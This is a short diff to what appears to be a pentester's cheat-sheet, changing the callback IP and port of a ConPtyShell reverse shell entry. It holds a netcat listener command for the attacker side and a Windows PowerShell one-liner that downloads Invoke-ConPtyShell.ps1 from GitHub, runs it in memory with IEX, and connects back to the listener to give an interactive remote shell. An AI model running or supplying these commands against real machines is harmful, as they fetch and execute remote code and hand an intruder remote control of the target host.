@@ -101,7 +101,7 @@ conpty shell ->
 server/kali: stty raw -echo; (stty size; cat) | nc -lvnp 9003
 
 windows:
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.1.17 9003
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.1.3.165 8000
 
 -> reverse shell 
 
